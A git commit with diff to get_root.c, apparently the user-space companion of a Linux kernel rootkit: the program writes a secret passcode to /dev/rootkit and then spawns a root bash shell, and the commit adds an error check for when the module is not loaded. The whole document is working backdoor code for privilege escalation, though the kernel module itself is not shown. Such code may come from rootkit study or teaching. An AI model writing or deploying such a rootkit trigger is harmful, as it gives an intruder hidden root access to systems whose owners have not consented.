e89442d53aa7cdcb17fa7bae21b94ef2f438510f
niv256 <niv25600@gmail.com>
2020-08-13 17:48:09 +0300

    Fix get_root in case of fopen failure

--- get_root/get_root.c
+++ get_root/get_root.c
@@ -6,11 +6,17 @@
 int main(void) {
 	// open /dev/rootkit for writing and write the passcode
 	FILE *fp = fopen("/dev/rootkit", "w");
+	if (!fp) {
+		puts("Error, /dev/rootkit couldn't open.");	
+		puts("Is the rootkit module loaded?");	
+		return 1;
+	}
+
 	fprintf(fp, PLEASE_GIVE_ME_ROOT);
 	fflush(fp);
 
 	// spawn shell as a root id
-	printf("[+] root shell:\n");
+	puts("[+] root shell:");
 	system("/bin/bash");
 	return 0;
 }
